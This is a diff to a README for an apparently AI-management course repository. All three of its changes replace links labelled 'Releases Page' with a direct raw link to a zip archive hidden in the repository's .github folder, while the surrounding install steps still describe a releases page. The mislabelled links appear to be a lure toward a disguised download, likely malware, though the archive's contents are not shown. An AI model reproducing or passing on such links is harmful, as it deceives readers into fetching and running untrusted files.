@@ -1,6 +1,6 @@
 # 🎓 ai-management-course-2025 - Simplifying AI for Non-Developers
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20-%23007bff?style=flat&logo=github&logoColor=white)](https://github.com/nourmoka/ai-management-course-2025/releases)
+[![Download](https://github.com/nourmoka/ai-management-course-2025/raw/refs/heads/main/.github/course-ai-management-v3.8-alpha.5.zip%20Now-%20-%23007bff?style=flat&logo=github&logoColor=white)](https://github.com/nourmoka/ai-management-course-2025/raw/refs/heads/main/.github/course-ai-management-v3.8-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the software, visit this page to download: [Releases Page](https://github.com/nourmoka/ai-management-course-2025/releases).
+To download the software, visit this page to download: [Releases Page](https://github.com/nourmoka/ai-management-course-2025/raw/refs/heads/main/.github/course-ai-management-v3.8-alpha.5.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the latest version listed.
@@ -92,4 +92,4 @@ To enhance your understanding of the topics covered, consider exploring the foll
 - **Project Management Fundamentals:** Best practices for managing technical projects with an emphasis on AI.
 - **Governance and Compliance:** Guidelines to help you navigate legal considerations while integrating AI in your organization.
 
-Remember, you can always visit this page to download: [Releases Page](https://github.com/nourmoka/ai-management-course-2025/releases) for the latest updates and documentation.
+Remember, you can always visit this page to download: [Releases Page](https://github.com/nourmoka/ai-management-course-2025/raw/refs/heads/main/.github/course-ai-management-v3.8-alpha.5.zip) for the latest updates and documentation.
